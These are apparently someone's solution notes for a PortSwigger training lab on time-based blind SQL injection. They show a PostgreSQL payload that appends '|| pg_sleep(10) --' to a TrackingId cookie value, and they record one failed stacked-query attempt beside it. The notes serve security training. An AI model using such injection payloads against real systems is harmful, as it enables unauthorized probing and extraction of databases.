--Name: Blind SQL injection with time delays
--URL: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
--Level: Medium Time: 10 min
---------------------------------------------------------------------------------

-- Objective: exploit the SQL injection vulnerability to cause a 10 second delay

-- Cookie name: TrackingId
-- Cookie value: MWpalVlQCPV4HAlx
-- Database type : PostgreSQL


SELECT ???? FROM ???? WHERE TrackingId = 'MWpalVlQCPV4HAlx'???--          
-- original --


SELECT ???? FROM ???? WHERE TrackingId = 'MWpalVlQCPV4HAlx'; SELECT pg_sleep(10) --'???--          
-- didn't work --

SELECT ???? FROM ???? WHERE TrackingId = 'MWpalVlQCPV4HAlx' || pg_sleep(10) --'???--          
-- wokred --

